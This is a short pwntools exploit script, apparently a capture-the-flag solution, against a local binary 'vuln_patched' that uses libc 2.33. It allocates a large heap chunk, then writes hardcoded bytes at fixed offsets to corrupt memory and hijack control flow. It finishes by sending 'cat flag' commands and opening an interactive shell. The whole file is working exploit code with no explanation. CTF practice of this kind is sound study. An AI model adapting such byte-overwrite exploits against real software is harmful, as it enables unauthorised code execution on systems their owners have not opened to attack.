#!/usr/bin/env python3

from pwn import *

exe = ELF("vuln_patched")
libc = ELF("./libc-2.33.so")
ld = ELF("./ld-2.33.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

def main():
    r = conn()

    def start_chunk(size):
        r.sendline(hex(size))

    def write_at_offset(offset, c): # ex [100, 101, 102] ["A", "B", "C"]

        for i in range(len(offset)):
            r.sendline(hex(offset[i]) + " " + hex(ord(c[i])))

    
    start_chunk(0x100000)

    r.sendline(hex(10))

    #offset I need = 0x72f36

    #write_at_offset([0x3081d0], ["\x28"])
    #write_at_offset([0x3081d0 + 1], ["\x42"])
    
    pause()
    write_at_offset([0x3081d0], ['\xa0'])
    write_at_offset([0x3081d0 + 1], ['\x2d'])
    write_at_offset([0x3081d0 + 2], ['\x17'])
    write_at_offset([0x3081d0 + 3], ['\x00'])
    write_at_offset([0x3081d0 + 4], ['\x00'])
    write_at_offset([0x3081d0 + 5], ['\x00'])

    write_at_offset([0x3082e0], ["\xc0"])
    write_at_offset([0x3082e0 + 1], ["\x7f"])

    write_at_offset([0x2cf3c0], ["\x66"])
    write_at_offset([0x2cf3c0 + 2], ["\xec"])

    r.sendline("cat flag*")
    r.sendline("cat /flag*")
    r.sendline("cat /home/flag*")
    
    r.interactive()


if __name__ == "__main__":
    main()
